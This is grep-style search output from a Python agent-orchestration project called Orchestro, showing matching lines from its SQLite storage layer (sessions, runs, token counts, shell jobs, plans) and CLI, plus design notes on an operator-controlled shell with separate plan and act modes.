src/orchestro/db.py:596:    tokens = re.findall(r"[A-Za-z0-9_]+", text.lower())
src/orchestro/db.py:597:    if not tokens:
src/orchestro/db.py:599:    return " OR ".join(f'"{token}"' for token in tokens)
src/orchestro/db.py:603:    def __init__(self, path: Path) -> None:
src/orchestro/db.py:604:        self.path = path
src/orchestro/db.py:605:        self.path.parent.mkdir(parents=True, exist_ok=True)
src/orchestro/db.py:611:        conn = sqlite3.connect(self.path)
src/orchestro/db.py:613:        conn.execute("PRAGMA foreign_keys = ON;")
src/orchestro/db.py:623:            conn.executescript(SCHEMA)
src/orchestro/db.py:624:            self._ensure_column(conn, "shell_jobs", "cancel_requested_at", "TEXT")
src/orchestro/db.py:625:            self._ensure_column(conn, "shell_jobs", "cancel_reason", "TEXT")
src/orchestro/db.py:626:            self._ensure_column(conn, "shell_jobs", "control_state", "TEXT NOT NULL DEFAULT 'running'")
src/orchestro/db.py:627:            self._ensure_column(conn, "shell_jobs", "control_reason", "TEXT")
src/orchestro/db.py:632:            self._ensure_column(conn, "runs", "session_id", "TEXT REFERENCES sessions(id)")
src/orchestro/db.py:636:            self._ensure_column(conn, "runs", "prompt_tokens", "INTEGER NOT NULL DEFAULT 0")
src/orchestro/db.py:637:            self._ensure_column(conn, "runs", "completion_tokens", "INTEGER NOT NULL DEFAULT 0")
src/orchestro/db.py:638:            self._ensure_column(conn, "runs", "total_tokens", "INTEGER NOT NULL DEFAULT 0")
src/orchestro/db.py:640:            self._ensure_column(conn, "runs", "cache_read_tokens", "INTEGER NOT NULL DEFAULT 0")
src/orchestro/db.py:641:            self._ensure_column(conn, "runs", "cache_write_tokens", "INTEGER NOT NULL DEFAULT 0")
src/orchestro/db.py:650:        rows = conn.execute(f"PRAGMA table_info({table_name})").fetchall()
src/orchestro/db.py:655:            conn.execute(f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_def}")
src/orchestro/db.py:679:    def create_session(
src/orchestro/db.py:682:        session_id: str,
src/orchestro/db.py:684:        parent_session_id: str | None = None,
src/orchestro/db.py:692:            conn.execute(
src/orchestro/db.py:694:                INSERT INTO sessions (
src/orchestro/db.py:695:                    id, parent_session_id, fork_point_run_id, title, status, summary, context_snapshot, created_at, updated_at
src/orchestro/db.py:699:                (session_id, parent_session_id, fork_point_run_id, title, status, summary, context_snapshot, now, now),
src/orchestro/db.py:702:    def get_session(self, session_id: str) -> SessionRecord | None:
src/orchestro/db.py:704:            row = conn.execute("SELECT * FROM sessions WHERE id = ?", (session_id,)).fetchone()
src/orchestro/db.py:707:        return self._row_to_session(row)
src/orchestro/db.py:709:    def list_sessions(self, limit: int = 20, *, status: str | None = None) -> list[SessionRecord]:
src/orchestro/db.py:717:            rows = conn.execute(
src/orchestro/db.py:720:                FROM sessions
src/orchestro/db.py:727:        return [self._row_to_session(row) for row in rows]
src/orchestro/db.py:729:    def update_session(
src/orchestro/db.py:732:        session_id: str,
src/orchestro/db.py:753:        params.append(session_id)
src/orchestro/db.py:755:            row = conn.execute(
src/orchestro/db.py:756:                f"UPDATE sessions SET {', '.join(clauses)} WHERE id = ?",
src/orchestro/db.py:761:    def list_session_runs(self, session_id: str, limit: int = 200) -> list[RunRecord]:
src/orchestro/db.py:763:            rows = conn.execute(
src/orchestro/db.py:767:                WHERE session_id = ?
src/orchestro/db.py:771:                (session_id, limit),
src/orchestro/db.py:784:        session_id: str | None = None,
src/orchestro/db.py:789:            conn.execute(
src/orchestro/db.py:792:                    id, parent_run_id, session_id, goal, status, backend_name, strategy_name,
src/orchestro/db.py:800:                    session_id,
src/orchestro/db.py:810:            if session_id:
src/orchestro/db.py:811:                conn.execute("UPDATE sessions SET updated_at = ? WHERE id = ?", (now, session_id))
src/orchestro/db.py:823:            conn.execute("BEGIN IMMEDIATE")
src/orchestro/db.py:824:            row = conn.execute(
src/orchestro/db.py:829:            conn.execute(
src/orchestro/db.py:843:            conn.execute(
src/orchestro/db.py:849:    def append_shell_job_event(
src/orchestro/db.py:859:            conn.execute("BEGIN IMMEDIATE")
src/orchestro/db.py:860:            row = conn.execute(
src/orchestro/db.py:861:                "SELECT COALESCE(MAX(sequence_no), 0) + 1 AS next_no FROM shell_job_events WHERE job_id = ?",
src/orchestro/db.py:865:            conn.execute(
src/orchestro/db.py:867:                INSERT INTO shell_job_events (id, job_id, event_type, sequence_no, created_at, payload_json)
src/orchestro/db.py:879:            conn.execute(
src/orchestro/db.py:880:                "UPDATE shell_jobs SET updated_at = ? WHERE id = ?",
src/orchestro/db.py:888:            run = conn.execute(
src/orchestro/db.py:899:            conn.execute(
src/orchestro/db.py:907:            conn.execute(
src/orchestro/db.py:926:            conn.execute("DELETE FROM interaction_fts WHERE source_id = ?", (run_id,))
src/orchestro/db.py:927:            conn.execute(
src/orchestro/db.py:957:            conn.execute(
src/orchestro/db.py:974:            conn.execute(
src/orchestro/db.py:1002:            row = conn.execute(
src/orchestro/db.py:1011:            row = conn.execute(
src/orchestro/db.py:1024:            row = conn.execute(
src/orchestro/db.py:1037:            conn.execute(
src/orchestro/db.py:1050:            row = conn.execute(
src/orchestro/db.py:1067:    def update_run_token_usage(
src/orchestro/db.py:1071:        prompt_tokens: int,
src/orchestro/db.py:1072:        completion_tokens: int,
src/orchestro/db.py:1073:        total_tokens: int,
src/orchestro/db.py:1074:        cache_read_tokens: int = 0,
src/orchestro/db.py:1075:        cache_write_tokens: int = 0,
src/orchestro/db.py:1079:            row = conn.execute(
src/orchestro/db.py:1082:                SET prompt_tokens = prompt_tokens + ?,
src/orchestro/db.py:1083:                    completion_tokens = completion_tokens + ?,
src/orchestro/db.py:1084:                    total_tokens = total_tokens + ?,
src/orchestro/db.py:1085:                    cache_read_tokens = cache_read_tokens + ?,
src/orchestro/db.py:1086:                    cache_write_tokens = cache_write_tokens + ?,
src/orchestro/db.py:1091:                    prompt_tokens,
src/orchestro/db.py:1092:                    completion_tokens,
src/orchestro/db.py:1093:                    total_tokens,
src/orchestro/db.py:1094:                    cache_read_tokens,
src/orchestro/db.py:1095:                    cache_write_tokens,
src/orchestro/db.py:1102:    def sum_session_tokens(
src/orchestro/db.py:1104:        session_id: str | None = None,
src/orchestro/db.py:1108:            if session_id is not None:
src/orchestro/db.py:1109:                row = conn.execute(
src/orchestro/db.py:1111:                    SELECT COALESCE(SUM(prompt_tokens), 0),
src/orchestro/db.py:1112:                           COALESCE(SUM(completion_tokens), 0),
src/orchestro/db.py:1113:                           COALESCE(SUM(total_tokens), 0),
src/orchestro/db.py:1116:                    WHERE session_id = ?
src/orchestro/db.py:1118:                    (session_id,),
src/orchestro/db.py:1123:                        "prompt_tokens": 0,
src/orchestro/db.py:1124:                        "completion_tokens": 0,
src/orchestro/db.py:1125:                        "total_tokens": 0,
src/orchestro/db.py:1129:                row = conn.execute(
src/orchestro/db.py:1131:                    SELECT COALESCE(SUM(prompt_tokens), 0),
src/orchestro/db.py:1132:                           COALESCE(SUM(completion_tokens), 0),
src/orchestro/db.py:1133:                           COALESCE(SUM(total_tokens), 0),
src/orchestro/db.py:1142:                    "prompt_tokens": 0,
src/orchestro/db.py:1143:                    "completion_tokens": 0,
src/orchestro/db.py:1144:                    "total_tokens": 0,
src/orchestro/db.py:1149:            "prompt_tokens": int(row[0]),
src/orchestro/db.py:1150:            "completion_tokens": int(row[1]),
src/orchestro/db.py:1151:            "total_tokens": int(row[2]),
src/orchestro/db.py:1155:    def sum_session_cache_tokens(
src/orchestro/db.py:1157:        session_id: str | None = None,
src/orchestro/db.py:1161:            if session_id is not None:
src/orchestro/db.py:1162:                row = conn.execute(
src/orchestro/db.py:1164:                    SELECT COALESCE(SUM(cache_read_tokens), 0),
src/orchestro/db.py:1165:                           COALESCE(SUM(cache_write_tokens), 0)
src/orchestro/db.py:1167:                    WHERE session_id = ?
src/orchestro/db.py:1169:                    (session_id,),
src/orchestro/db.py:1173:                    return {"cache_read_tokens": 0, "cache_write_tokens": 0}
src/orchestro/db.py:1175:                row = conn.execute(
src/orchestro/db.py:1177:                    SELECT COALESCE(SUM(cache_read_tokens), 0),
src/orchestro/db.py:1178:                           COALESCE(SUM(cache_write_tokens), 0)
src/orchestro/db.py:1185:                return {"cache_read_tokens": 0, "cache_write_tokens": 0}
src/orchestro/db.py:1188:            "cache_read_tokens": int(row[0]),
src/orchestro/db.py:1189:            "cache_write_tokens": int(row[1]),
src/orchestro/db.py:1202:            conn.execute(
src/orchestro/db.py:1210:    def create_shell_job(
src/orchestro/db.py:1221:            conn.execute(
src/orchestro/db.py:1223:                INSERT INTO shell_jobs (
src/orchestro/db.py:1231:        self.append_shell_job_event(
src/orchestro/db.py:1243:    def attach_shell_job_run(self, *, job_id: str, run_id: str) -> None:
src/orchestro/db.py:1245:            conn.execute(
src/orchestro/db.py:1247:                UPDATE shell_jobs
src/orchestro/db.py:1253:        self.append_shell_job_event(
src/orchestro/db.py:1260:    def update_shell_job(
src/orchestro/db.py:1268:            conn.execute(
src/orchestro/db.py:1270:                UPDATE shell_jobs
src/orchestro/db.py:1277:    def update_shell_job_status(self, *, job_id: str, status: str) -> None:
src/orchestro/db.py:1279:            conn.execute(
src/orchestro/db.py:1281:                UPDATE shell_jobs
src/orchestro/db.py:1288:    def request_shell_job_pause(self, *, job_id: str, reason: str | None = None) -> bool:
src/orchestro/db.py:1291:            row = conn.execute(
src/orchestro/db.py:1292:                "SELECT status, control_state FROM shell_jobs WHERE id = ?",
src/orchestro/db.py:1301:            conn.execute(
src/orchestro/db.py:1303:                UPDATE shell_jobs
src/orchestro/db.py:1311:        self.append_shell_job_event(
src/orchestro/db.py:1319:    def request_shell_job_resume(self, *, job_id: str, reason: str | None = None) -> bool:
src/orchestro/db.py:1322:            row = conn.execute(
src/orchestro/db.py:1323:                "SELECT status, control_state FROM shell_jobs WHERE id = ?",
src/orchestro/db.py:1332:            conn.execute(
src/orchestro/db.py:1334:                UPDATE shell_jobs
src/orchestro/db.py:1342:        self.append_shell_job_event(
src/orchestro/db.py:1350:    def get_shell_job_control_state(self, job_id: str) -> str | None:
src/orchestro/db.py:1352:            row = conn.execute(
src/orchestro/db.py:1353:                "SELECT control_state FROM shell_jobs WHERE id = ?",
src/orchestro/db.py:1360:    def request_shell_job_cancel(self, *, job_id: str, reason: str | None = None) -> bool:
src/orchestro/db.py:1363:            row = conn.execute(
src/orchestro/db.py:1364:                "SELECT status FROM shell_jobs WHERE id = ?",
src/orchestro/db.py:1371:            conn.execute(
src/orchestro/db.py:1373:                UPDATE shell_jobs
src/orchestro/db.py:1382:        self.append_shell_job_event(
src/orchestro/db.py:1390:    def is_shell_job_cancel_requested(self, job_id: str) -> bool:
src/orchestro/db.py:1392:            row = conn.execute(
src/orchestro/db.py:1395:                FROM shell_jobs
src/orchestro/db.py:1402:    def get_shell_job(self, job_id: str) -> ShellJobRecord | None:
src/orchestro/db.py:1404:            row = conn.execute("SELECT * FROM shell_jobs WHERE id = ?", (job_id,)).fetchone()
src/orchestro/db.py:1407:        return self._row_to_shell_job(row)
src/orchestro/db.py:1409:    def list_shell_job_events(self, job_id: str) -> list[ShellJobEventRecord]:
src/orchestro/db.py:1411:            rows = conn.execute(
src/orchestro/db.py:1414:                FROM shell_job_events
src/orchestro/db.py:1420:        return [self._row_to_shell_job_event(row) for row in rows]
src/orchestro/db.py:1422:    def get_shell_job_by_run_id(self, run_id: str) -> ShellJobRecord | None:
src/orchestro/db.py:1424:            row = conn.execute(
src/orchestro/db.py:1425:                "SELECT * FROM shell_jobs WHERE run_id = ? ORDER BY updated_at DESC LIMIT 1",
src/orchestro/db.py:1430:        return self._row_to_shell_job(row)
src/orchestro/db.py:1432:    def list_shell_jobs(self, limit: int = 20) -> list[ShellJobRecord]:
src/orchestro/db.py:1434:            rows = conn.execute(
src/orchestro/db.py:1437:                FROM shell_jobs
src/orchestro/db.py:1443:        return [self._row_to_shell_job(row) for row in rows]
src/orchestro/db.py:1456:            conn.execute(
src/orchestro/db.py:1475:            row = conn.execute(
src/orchestro/db.py:1489:    def list_approval_requests(self, *, status: str | None = None, session_id: str | None = None, limit: int = 50) -> list[ApprovalRequestRecord]:
src/orchestro/db.py:1495:        if session_id:
src/orchestro/db.py:1496:            clauses.append("session_id = ?")
src/orchestro/db.py:1497:            params.append(session_id)
src/orchestro/db.py:1501:            rows = conn.execute(
src/orchestro/db.py:1515:            row = conn.execute(
src/orchestro/db.py:1534:            cursor = conn.execute(
src/orchestro/db.py:1544:    def enqueue_shell_job_input(
src/orchestro/db.py:1553:            conn.execute(
src/orchestro/db.py:1555:                INSERT INTO shell_job_inputs (id, job_id, run_id, input_text, status, created_at)
src/orchestro/db.py:1561:    def consume_pending_shell_job_inputs(self, *, job_id: str) -> list[ShellJobInputRecord]:
src/orchestro/db.py:1564:            rows = conn.execute(
src/orchestro/db.py:1567:                FROM shell_job_inputs
src/orchestro/db.py:1575:            conn.execute(
src/orchestro/db.py:1577:                UPDATE shell_job_inputs
src/orchestro/db.py:1597:    def list_shell_job_inputs(
src/orchestro/db.py:1612:            rows = conn.execute(
src/orchestro/db.py:1615:                FROM shell_job_inputs
src/orchestro/db.py:1622:        return [self._row_to_shell_job_input(row) for row in rows]
src/orchestro/db.py:1637:            conn.execute(
src/orchestro/db.py:1648:                conn.execute(
src/orchestro/db.py:1660:            rows = conn.execute(
src/orchestro/db.py:1673:            row = conn.execute("SELECT * FROM plans WHERE id = ?", (plan_id,)).fetchone()
src/orchestro/db.py:1680:            rows = conn.execute(
src/orchestro/db.py:1701:            conn.execute("BEGIN IMMEDIATE")
src/orchestro/db.py:1702:            row = conn.execute(
src/orchestro/db.py:1707:            conn.execute(
src/orchestro/db.py:1721:            conn.execute(
src/orchestro/db.py:1729:            rows = conn.execute(
src/orchestro/db.py:1742:            row = conn.execute(
src/orchestro/db.py:1757:            conn.execute(
src/orchestro/db.py:1769:            conn.execute(
src/orchestro/db.py:1777:            conn.execute(
src/orchestro/db.py:1792:            rows = conn.execute(
src/orchestro/db.py:1802:                conn.execute(
src/orchestro/db.py:1811:            conn.execute(
src/orchestro/db.py:1820:            conn.execute("UPDATE plans SET updated_at = ? WHERE id = ?", (now, plan_id))
src/orchestro/db.py:1833:            cursor = conn.execute(
src/orchestro/db.py:1841:            conn.execute("UPDATE plans SET updated_at = ? WHERE id = ?", (now, plan_id))
src/orchestro/db.py:1847:            existing = conn.execute(
src/orchestro/db.py:1853:            conn.execute(
src/orchestro/db.py:1857:            rows = conn.execute(
src/orchestro/db.py:1867:                conn.execute(
src/orchestro/db.py:1875:            plan = conn.execute("SELECT current_step_no FROM plans WHERE id = ?", (plan_id,)).fetchone()
src/orchestro/db.py:1881:                replacement = conn.execute(
src/orchestro/db.py:1888:                    replacement = conn.execute(
src/orchestro/db.py:1893:            conn.execute(
src/orchestro/db.py:1908:            conn.execute(
src/orchestro/db.py:1917:                conn.execute(
src/orchestro/db.py:1926:            conn.execute(
src/orchestro/db.py:1938:            plan = conn.execute(
src/orchestro/db.py:1945:            next_step = conn.execute(
src/orchestro/db.py:1956:                conn.execute(
src/orchestro/db.py:1966:            conn.execute(
src/orchestro/db.py:1979:            existing = conn.execute(
src/orchestro/db.py:1989:            conn.execute(
src/orchestro/db.py:2009:            conn.execute(
src/orchestro/db.py:2028:            rows = conn.execute(
src/orchestro/db.py:2041:            row = conn.execute(
src/orchestro/db.py:2058:            row = conn.execute(
src/orchestro/db.py:2081:            conn.execute(
src/orchestro/db.py:2107:            rows = conn.execute(
src/orchestro/db.py:2122:            row = conn.execute(
src/orchestro/db.py:2133:            conn.execute(
src/orchestro/db.py:2146:            conn.execute(
src/orchestro/db.py:2153:            conn.execute(
src/orchestro/db.py:2166:            conn.execute(
src/orchestro/db.py:2177:            row = conn.execute(
src/orchestro/db.py:2203:            rows = conn.execute(
src/orchestro/db.py:2217:            conn.execute(
src/orchestro/db.py:2231:            conn.execute(
src/orchestro/db.py:2243:            conn.execute(
src/orchestro/db.py:2259:        session_id: str | None = None,
src/orchestro/db.py:2275:            rows = conn.execute(
src/orchestro/db.py:2289:            rows = conn.execute(
src/orchestro/db.py:2303:            row = conn.execute("SELECT * FROM runs WHERE id = ?", (run_id,)).fetchone()
src/orchestro/db.py:2310:            rows = conn.execute(
src/orchestro/db.py:2334:            rows = conn.execute(
src/orchestro/db.py:2377:            target = conn.execute(
src/orchestro/db.py:2388:            neighbors = conn.execute(
src/orchestro/db.py:2429:            rows = conn.execute(
src/orchestro/db.py:2445:            total = conn.execute("SELECT COUNT(*) FROM runs WHERE status = 'done'").fetchone()[0]
src/orchestro/db.py:2446:            rated = conn.execute(
src/orchestro/db.py:2454:            good = conn.execute(
src/orchestro/db.py:2457:            bad = conn.execute(
src/orchestro/db.py:2479:            rows = conn.execute(
src/orchestro/db.py:2510:            conn.execute(
src/orchestro/db.py:2526:            rows = conn.execute(
src/orchestro/db.py:2540:            rows = conn.execute(
src/orchestro/db.py:2553:            row = conn.execute("SELECT * FROM facts WHERE id = ?", (fact_id,)).fetchone()
src/orchestro/db.py:2561:            row = conn.execute(
src/orchestro/db.py:2579:            conn.execute(
src/orchestro/db.py:2598:            conn.execute("DELETE FROM correction_fts WHERE source_id = ?", (correction_id,))
src/orchestro/db.py:2599:            conn.execute(
src/orchestro/db.py:2632:            conn.execute(
src/orchestro/db.py:2641:            conn.execute("DELETE FROM postmortem_fts WHERE source_id = ?", (run_id,))
src/orchestro/db.py:2642:            conn.execute(
src/orchestro/db.py:2668:            rows = conn.execute(
src/orchestro/db.py:2697:            rows = conn.execute(
src/orchestro/db.py:2744:            rows = conn.execute(
src/orchestro/db.py:2773:            rows = conn.execute(
src/orchestro/db.py:2805:                rows = conn.execute(
src/orchestro/db.py:2842:                rows = conn.execute(
src/orchestro/db.py:2881:                row = conn.execute("SELECT vec_version() AS version").fetchone()
src/orchestro/db.py:2906:            rows = conn.execute(
src/orchestro/db.py:2930:            conn.execute(
src/orchestro/db.py:2942:                row = conn.execute(
src/orchestro/db.py:2956:                row = conn.execute(
src/orchestro/db.py:2990:            conn.execute(
src/orchestro/db.py:3026:                rows = conn.execute(
src/orchestro/db.py:3063:                rows = conn.execute(
src/orchestro/db.py:3102:                rows = conn.execute(
src/orchestro/db.py:3122:                rows = conn.execute(
src/orchestro/db.py:3153:            conn.execute(
src/orchestro/db.py:3156:                    collection_id, name, description, source_type, source_path, source_url
src/orchestro/db.py:3165:                    kwargs.get("source_path"),
src/orchestro/db.py:3172:            rows = conn.execute(
src/orchestro/db.py:3185:            row = conn.execute(
src/orchestro/db.py:3203:            conn.execute(
src/orchestro/db.py:3212:            conn.execute(
src/orchestro/db.py:3235:            rows = conn.execute(
src/orchestro/db.py:3270:            chunk_rowids = conn.execute(
src/orchestro/db.py:3275:                conn.execute(
src/orchestro/db.py:3279:            conn.execute(
src/orchestro/db.py:3283:            conn.execute(
src/orchestro/db.py:3291:            row = conn.execute(
src/orchestro/db.py:3296:            conn.execute(
src/orchestro/db.py:3311:            source_path=row["source_path"],
src/orchestro/db.py:3318:    def _row_to_session(self, row: sqlite3.Row) -> SessionRecord:
src/orchestro/db.py:3321:            parent_session_id=row["parent_session_id"],
src/orchestro/db.py:3334:            session_id=row["session_id"],
src/orchestro/db.py:3354:            prompt_tokens=row["prompt_tokens"],
src/orchestro/db.py:3355:            completion_tokens=row["completion_tokens"],
src/orchestro/db.py:3356:            total_tokens=row["total_tokens"],
src/orchestro/db.py:3357:            cache_read_tokens=row["cache_read_tokens"],
src/orchestro/db.py:3358:            cache_write_tokens=row["cache_write_tokens"],
src/orchestro/db.py:3422:    def _row_to_shell_job(self, row: sqlite3.Row) -> ShellJobRecord:
src/orchestro/db.py:3440:    def _row_to_shell_job_event(self, row: sqlite3.Row) -> ShellJobEventRecord:
src/orchestro/db.py:3464:    def _row_to_shell_job_input(self, row: sqlite3.Row) -> ShellJobInputRecord:
src/orchestro/db.py:3567:        row = conn.execute(
src/orchestro/db.py:3576:            conn.execute(
src/orchestro/db.py:3596:            conn.execute(
docs/adr-agent-loop-patterns.md:27:- a controllable shell with background jobs and subprocess control
docs/adr-agent-loop-patterns.md:45:- `act` mode: tool execution against an approved or current plan
docs/adr-agent-loop-patterns.md:47:This is the preferred replacement for unstructured step-by-step agent loops. Plans should be visible, editable, and resumable from the shell.
docs/adr-agent-loop-patterns.md:54:2. execute one step at a time
docs/adr-agent-loop-patterns.md:114:Subagents should be spawned with minimal, explicit context.
docs/adr-agent-loop-patterns.md:157:- plan-mode vs act-mode shell workflow
docs/adr-agent-loop-patterns.md:173:- explicit context-provider selection in the shell
docs/adr-agent-loop-patterns.md:195:- safer multi-step execution
docs/adr-agent-loop-patterns.md:196:- clearer control semantics in the shell
docs/roadmap.md:29:- separate plan mode from act mode in the shell
docs/roadmap.md:34:Build the minimum usable path:
docs/roadmap.md:38:- create a small Python proxy or orchestrator service
docs/roadmap.md:41:- add a shell command for rating results
docs/roadmap.md:44:- establish the shell loop separate from the agent loop
docs/roadmap.md:50:- a request can be sent through the proxy
docs/roadmap.md:54:- one backend works end to end through the shell
docs/roadmap.md:55:- plan approval and execution feel explicit rather than magical
docs/roadmap.md:63:- do not introduce an ORM for the core memory path
docs/roadmap.md:64:- do not hide multi-step execution behind an opaque ReAct loop
docs/roadmap.md:75:- a SQLite-native vector index path for semantic search
docs/roadmap.md:113:Build the interactive shell around the orchestrator:
docs/roadmap.md:121:- visible current plan and execution cursor
docs/roadmap.md:125:- long-running runs do not block the shell
docs/roadmap.md:136:1. Python syntax or execution verification
docs/roadmap.md:234:Once the local path is solid, add more backends through the shared interface.
docs/roadmap.md:246:- the shell supports operator-driven escalation between backend tiers
docs/roadmap.md:257:- what the shell event model should look like
docs/roadmap.md:283:7. an initial shell loop with visible run state
docs/roadmap.md:284:8. a visible plan representation with execution cursor
docs/roadmap.md:307:If that happens, the migration path should be:
docs/architecture.md:157:The initial embedding path should be simple and local:
docs/architecture.md:201:A backend is responsible for taking a prompt, context, and execution options and returning a normalized result.
docs/architecture.md:208:- CLI-driven remote backends invoked as subprocess tools during interactive sessions
docs/architecture.md:237:The shell loop and the agent loop should be separate.
docs/architecture.md:239:The shell is a client for starting, observing, interrupting, and resuming agent runs. The agent runner is the execution engine that performs the work.
docs/architecture.md:252:- cancelling or pausing work without killing the shell
docs/architecture.md:272:The primary UX should be a terminal-native shell rather than a chat window.
docs/architecture.md:276:- normal shell-style history and editing
docs/architecture.md:282:The shell should feel closer to `ipython` or `psql` than to a terminal-styled web chat.
docs/architecture.md:284:The shell should also expose explicit execution modes:
docs/architecture.md:287:- act mode for executing the current approved plan
docs/architecture.md:289:The operator should be able to inspect or edit the plan before execution, approve the transition into act mode, and return to plan mode when reality diverges from the expected path.
docs/architecture.md:309:2. execute one step at a time
docs/architecture.md:312:Plans should be structured, visible, and resumable. A paused run is effectively a plan plus an execution cursor.
docs/architecture.md:324:- Python parsing or execution
docs/architecture.md:348:- `spawn_subagent`
docs/architecture.md:356:When a tool call fails, the retry path should require an explicit diagnosis of what failed and what will change before the next attempt.
docs/architecture.md:526:The shell should also support explicit escalation so the operator can rerun a task on a stronger backend without reconstructing context manually.
src/orchestro/cli.py:14:from pathlib import Path
src/orchestro/cli.py:25:    default_benchmark_suite_path,
src/orchestro/cli.py:37:from orchestro.paths import db_path, facts_path, global_instructions_path, tool_approvals_path
src/orchestro/cli.py:59:    ask_parser.add_argument("goal", help="Prompt or goal to execute.")
src/orchestro/cli.py:69:    shell_parser = subparsers.add_parser("shell", help="Launch the Orchestro shell.")
src/orchestro/cli.py:70:    shell_parser.add_argument("--backend", default="auto", help="Default backend or alias.")
src/orchestro/cli.py:71:    shell_parser.add_argument("--model", "-m", default=None, help="Model alias (e.g. fast, smart, code, local).")
src/orchestro/cli.py:72:    shell_parser.add_argument("--strategy", default="direct", help="Default strategy (direct, tool-loop, reflect-retry, self-consistency, critique-revise).")
src/orchestro/cli.py:73:    shell_parser.add_argument("--domain", default=None, help="Default domain label.")
src/orchestro/cli.py:74:    shell_parser.add_argument("--providers", default=",".join(DEFAULT_CONTEXT_PROVIDERS), help="Comma-separated default context providers.")
src/orchestro/cli.py:130:    sessions_parser = subparsers.add_parser("sessions", help="List persisted sessions.")
src/orchestro/cli.py:131:    sessions_parser.add_argument("--limit", type=int, default=20)
src/orchestro/cli.py:132:    sessions_parser.add_argument("--status", default=None)
src/orchestro/cli.py:134:    session_new_parser = subparsers.add_parser("session-new", help="Create a new session.")
src/orchestro/cli.py:135:    session_new_parser.add_argument("title", nargs="?", default=None)
src/orchestro/cli.py:137:    session_show_parser = subparsers.add_parser("session-show", help="Show one session.")
src/orchestro/cli.py:138:    session_show_parser.add_argument("session_id")
src/orchestro/cli.py:140:    session_resume_parser = subparsers.add_parser("session-resume", help="Resolve and show one session.")
src/orchestro/cli.py:141:    session_resume_parser.add_argument("session_id")
src/orchestro/cli.py:143:    session_fork_parser = subparsers.add_parser("session-fork", help="Fork a session from a run or current head.")
src/orchestro/cli.py:144:    session_fork_parser.add_argument("session_id")
src/orchestro/cli.py:145:    session_fork_parser.add_argument("title", nargs="?", default=None)
src/orchestro/cli.py:146:    session_fork_parser.add_argument("--run-id", default=None)
src/orchestro/cli.py:148:    session_compact_parser = subparsers.add_parser("session-compact", help="Compact one session into a stored context snapshot.")
src/orchestro/cli.py:149:    session_compact_parser.add_argument("session_id")
src/orchestro/cli.py:150:    session_compact_parser.add_argument("--limit", type=int, default=50)
src/orchestro/cli.py:185:    bench_local_parser.add_argument("--suite", default=str(default_benchmark_suite_path()))
src/orchestro/cli.py:190:    bench_matrix_parser.add_argument("--suite", default=str(default_benchmark_suite_path()))
src/orchestro/cli.py:196:    bench_parser.add_argument("--suite", default=str(default_benchmark_suite_path()))
src/orchestro/cli.py:268:    shell_jobs_parser = subparsers.add_parser("shell-jobs", help="List persisted shell jobs.")
src/orchestro/cli.py:269:    shell_jobs_parser.add_argument("--limit", type=int, default=20)
src/orchestro/cli.py:271:    shell_job_show_parser = subparsers.add_parser("shell-job-show", help="Show one shell job and its events.")
src/orchestro/cli.py:272:    shell_job_show_parser.add_argument("job_id")
src/orchestro/cli.py:274:    shell_job_inject_parser = subparsers.add_parser("shell-job-inject", help="Queue operator input for a shell job.")
src/orchestro/cli.py:275:    shell_job_inject_parser.add_argument("job_id")
src/orchestro/cli.py:276:    shell_job_inject_parser.add_argument("note")
src/orchestro/cli.py:277:    shell_job_inject_parser.add_argument("--resume", action="store_true")
src/orchestro/cli.py:278:    shell_job_inject_parser.add_argument("--replan", action="store_true")
src/orchestro/cli.py:373:    schedule_add_parser.add_argument("goal", help="Goal to execute on schedule.")
src/orchestro/cli.py:416:    collection_ingest_parser.add_argument("path")
src/orchestro/cli.py:430:    intro = "Orchestro shell. Type /help for commands, or enter a prompt to run it."
src/orchestro/cli.py:445:        self.tool_approvals = ToolApprovalStore(tool_approvals_path())
src/orchestro/cli.py:457:        self.current_session_id: str | None = None
src/orchestro/cli.py:458:        self.shell_invocation_run_ids: list[str] = []
src/orchestro/cli.py:463:        session_part = f":s={self.current_session_id[:6]}" if self.current_session_id else ""
src/orchestro/cli.py:464:        self.prompt = f"orchestro[{self.mode}:{self.cwd.name}{session_part}]> "
src/orchestro/cli.py:466:    def _track_shell_run(self, run_id: str) -> None:
src/orchestro/cli.py:467:        if run_id not in self.shell_invocation_run_ids:
src/orchestro/cli.py:468:            self.shell_invocation_run_ids.append(run_id)
src/orchestro/cli.py:507:                self.app.db.attach_shell_job_run(job_id=job_id, run_id=prepared.run_id)
src/orchestro/cli.py:512:                        if self.app.db.is_shell_job_cancel_requested(job_id):
src/orchestro/cli.py:515:                if self.app.db.is_shell_job_cancel_requested(job_id):
src/orchestro/cli.py:516:                    self.app.db.append_shell_job_event(
src/orchestro/cli.py:520:                        payload={"reason": "shell job canceled before backend execution"},
src/orchestro/cli.py:526:                        payload={"reason": "shell job canceled before backend execution"},
src/orchestro/cli.py:530:                        error_message="shell job canceled before backend execution",
src/orchestro/cli.py:532:                    self.app.db.update_shell_job(job_id=job_id, status="canceled")
src/orchestro/cli.py:534:                self.app.execute_prepared_run(
src/orchestro/cli.py:536:                    cancel_requested=lambda: self.app.db.is_shell_job_cancel_requested(job_id),
src/orchestro/cli.py:537:                    control_state=lambda: self.app.db.get_shell_job_control_state(job_id),
src/orchestro/cli.py:548:                    self.app.db.append_shell_job_event(
src/orchestro/cli.py:554:                    self.app.db.update_shell_job(job_id=job_id, status="canceled")
src/orchestro/cli.py:556:                if self.app.db.is_shell_job_cancel_requested(job_id):
src/orchestro/cli.py:557:                    self.app.db.append_shell_job_event(
src/orchestro/cli.py:561:                        payload={"reason": "cancel was requested during backend execution"},
src/orchestro/cli.py:567:                        payload={"reason": "cancel was requested during backend execution"},
src/orchestro/cli.py:569:                self.app.db.update_shell_job(job_id=job_id, status="done")
src/orchestro/cli.py:570:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:578:                self.app.db.update_shell_job(job_id=job_id, status="failed", error_message=str(exc))
src/orchestro/cli.py:579:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:587:        self.app.db.create_shell_job(
src/orchestro/cli.py:598:            job = self.app.db.get_shell_job(job_id)
src/orchestro/cli.py:601:                self._track_shell_run(job.run_id)
src/orchestro/cli.py:610:        jobs = self.app.db.list_shell_jobs(limit=limit)
src/orchestro/cli.py:612:            print("no shell jobs")
src/orchestro/cli.py:646:        token = arg.strip()
src/orchestro/cli.py:647:        if not token:
src/orchestro/cli.py:650:        job = self._resolve_job(token)
src/orchestro/cli.py:652:            print(f"unknown job or run: {token}")
src/orchestro/cli.py:654:        _print_shell_job(self.app, job.id)
src/orchestro/cli.py:661:        job = self.app.db.get_shell_job(job_id)
src/orchestro/cli.py:667:            job = self.app.db.get_shell_job(job_id)
